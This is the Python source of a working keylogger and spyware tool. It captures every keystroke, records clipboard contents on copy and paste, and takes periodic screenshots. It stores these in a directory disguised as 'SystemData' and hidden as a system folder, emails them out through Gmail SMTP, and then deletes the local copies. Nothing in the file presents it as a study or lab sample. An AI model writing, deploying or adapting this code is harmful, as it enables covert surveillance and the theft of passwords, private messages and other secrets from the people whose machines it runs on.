import time
import os, sys
import platform
# module used for capturing keys
from pynput import keyboard
# module used to get clipboard content
import pyperclip
# module used to take screenshot
from PIL import ImageGrab
import threading
# modules for sending email
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
# module for zipping file
import shutil
# module for reading config file
import json

# maximum file size in MB to be read
MAXFILESIZE = 5 * 1024
# maximum screenshots per email
MAXSCREENSHOTS = 5
CONTROL_CHARACTER_NAMES = [
    "Null (NUL)",
    "Start of Header (SOH)",
    "Start of Text (STX)",
    "End of Text (ETX)",
    "End of Transmission (EOT)",
    "Enquiry (ENQ)",
    "Acknowledge (ACK)",
    "Bell (BEL)",
    "Backspace (BS)",
    "Horizontal Tab (HT)",
    "Line Feed (LF)",
    "Vertical Tab (VT)",
    "Form Feed (FF)",
    "Carriage Return (CR)",
    "Shift Out (SO)",
    "Shift In (SI)",
    "Data Link Escape (DLE)",
    "Device Control 1 (DC1)",
    "Device Control 2 (DC2)",
    "Device Control 3 (DC3)",
    "Device Control 4 (DC4)",
    "Negative Acknowledge (NAK)",
    "Synchronous Idle (SYN)",
    "End of Transmission Block (ETB)",
    "Cancel (CAN)",
    "End of Medium (EM)",
    "Substitute (SUB)",
    "Escape (ESC)",
    "File Separator (FS)",
    "Group Separator (GS)",
    "Record Separator (RS)",
    "Unit Separator (US)",
    "Delete (DEL)"
]

logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
# makes and hides the directory by making is hidden and system file
os.makedirs(logPath, exist_ok=True)
if platform.system() == "Windows":
    os.system(f'attrib +h +s "{logPath}"')
elif platform.system() in ["Linux", "Darwin"]:
    hidden_file_path = os.path.join(os.path.dirname(logPath), "." + os.path.basename(logPath))
    os.rename(logPath, hidden_file_path)
    logPath = hidden_file_path
# set file name of txt file to store the logged keys
FILENAME = logPath + r"\log.txt"
# setting email variables from config file
config_file_path = os.path.join(os.path.dirname(__file__), "config.json")
with open(config_file_path) as config_file:
    config = json.load(config_file)
from_email = config["email"]
password_email = config["email_pass"]

# makes the directory for the screenshots
screenshotPath = os.path.join(logPath, "Temp")
os.makedirs(screenshotPath, exist_ok=True)

# start up the smtp server for emailing
context = ssl.create_default_context()
try:
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context)
    server.login(from_email, password_email)
except Exception:
    sys.exit(130)

def remove_files_in_directory(directory):
    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)
        if os.path.isfile(file_path):
            try:
                os.remove(file_path)
            except Exception as e:
                send_email("Error", from_email, e, True)
                sys.exit(130)

# function to send email of the logged data
def send_email(subject, to, body, close=False):
    email = MIMEMultipart()
    email["From"] = from_email
    email["To"] = to
    email["Subject"] = subject

    email.attach(MIMEText(body, "plain"))

    # addding the log text file as attachment
    if (os.path.exists(FILENAME)):
        with open(FILENAME, "r") as text:
            log_attachment = text.read()
        log_attachment_part = MIMEText(log_attachment, "plain")
        # adding header to attachment part
        log_attachment_part.add_header("Content-Disposition", "attachment", filename="log")
        # attaching it to the email
        email.attach(log_attachment_part)
    # adding the screenshots zip folder
    if (os.path.isdir(screenshotPath)):
        zip_file = shutil.make_archive(f"{logPath}/temp", "zip", screenshotPath)
        # reads the attachment in binary mode 
        with open(zip_file, "rb") as z:
            # tells the email system that the zip file is a binary file
            zip_part = MIMEBase("application", "zip")
            zip_part.set_payload(z.read())
        
        # encodeing the zip file in ASCII characters so the email can send it
        encoders.encode_base64(zip_part)
        zip_part.add_header("Content-Disposition", "attachment", filename="temp.zip")
        email.attach(zip_part)

    try:
        text = email.as_string()
        server.sendmail(from_email, to, text)
        # remove the files stored on the device
        if os.path.exists(FILENAME):
            os.remove(FILENAME)
        if (os.path.isdir(screenshotPath)):
            remove_files_in_directory(screenshotPath)
            os.remove(zip_file)
        if close:
            server.close()
    except Exception as e:
        sys.exit(130)



# creating a screenshot threading event to handle the thread properly
screenshotThreadEvent = threading.Event()
def take_screenshot(interval=10):
    num_screenshots = 0
    while not screenshotThreadEvent.is_set():
        try:
            if num_screenshots < MAXSCREENSHOTS:
                # takes the screenshot
                image = ImageGrab.grab()
                # takes the current time and name the image with that and the path
                screenshotTimeString = time.strftime("%Y-%m-%d-%H_%M_%S")
                imageName = os.path.join(screenshotPath, f"screenshot_{screenshotTimeString}.png")
                image.save(imageName)
                num_screenshots += 1
                # makes the thread wait for the specified time
                screenshotThreadEvent.wait(interval)
            else:
                num_screenshots = 0
                send_email("Reached Max", from_email, "Sent from program")
        except Exception as e:
            send_email("Error", from_email, e, True)
            sys.exit(130)


# a set to keep track of the keys pressed
pressedKeys = set()

def on_press(key):
    pressedKeys.add(key)
    
    lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
    # append if the file exists and smaller than specified size, otherwise overwrite it.
    if (os.path.exists(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
        flag = "a"
    else:
        flag = "w"
        send_email("Starting new log", from_email, "Sent from program")

    with open(FILENAME, flag) as f:
        try:
            if (keyboard.Key.ctrl_l in pressedKeys or keyboard.Key.ctrl_r in pressedKeys):
                ctrlCharOrd = ord(key.char) & 0x1F
                if ctrlCharOrd in range(32):
                    f.write(f"{CONTROL_CHARACTER_NAMES[ctrlCharOrd]} pressed at {lastKeyPressedTimeString}\n")
                elif ctrlCharOrd == 127:
                    f.write(f"{CONTROL_CHARACTER_NAMES[33]} pressed at {lastKeyPressedTimeString}\n")
                
                ctrlChar = chr(ctrlCharOrd)
                # ctrl + v is pressed which pynput reads as SYN ('\x16')
                if (ctrlChar == '\x16'):
                    with open(FILENAME, flag) as f:
                        clipboard = pyperclip.paste()
                        f.write(f"{clipboard} pasted at {lastKeyPressedTimeString}\n")
                # ctrl + c is pressed which pynput reads as ETX ('\x03')
                elif (ctrlChar == '\x03'):
                    with open(FILENAME, flag) as f:
                        time.sleep(1)
                        clipboard = pyperclip.paste()
                        f.write(f"{clipboard} copied at {lastKeyPressedTimeString}\n")
            else:
                f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
        except AttributeError:
            # for non-ascii characters
            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")

    # If Alt + Caps Lock is pressed, program terminates
    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
            and keyboard.Key.caps_lock in pressedKeys):
        send_email("Completion", from_email, "Sent from program", True)
        return False

def on_release(key):
    pressedKeys.discard(key)
    
# creates the thread for screenshots whilst still listening to keyboard
screenshotThread = threading.Thread(target=take_screenshot, args=(200,))
screenshotThread.start()

try:    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt as e:
    send_email("Error", from_email, "KeyboardInterrupt", True)
    sys.exit(130)
finally:
    # ends the thread
    screenshotThreadEvent.set()
    screenshotThread.join()
